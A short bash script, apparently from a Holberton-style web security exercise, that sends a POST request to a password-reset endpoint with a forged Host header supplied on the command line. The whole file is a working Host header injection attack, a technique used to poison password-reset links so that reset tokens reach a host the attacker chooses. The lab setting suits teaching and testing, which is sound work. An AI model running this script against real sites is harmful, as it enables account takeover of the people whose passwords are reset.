#!/bin/bash

# Check arguments
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <NEW_HOST> <TARGET_URL> <FORM_DATA>"
    echo "Example:"
    echo "  $0 newhost http://web0x00.hbtn/reset_password email=test@test.hbtn"
    exit 1
fi

NEW_HOST="$1"
TARGET_URL="$2"
FORM_DATA="$3"

# Send request with injected Host header
curl -i -X POST "$TARGET_URL" \
  -H "Host: $NEW_HOST" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "$FORM_DATA"
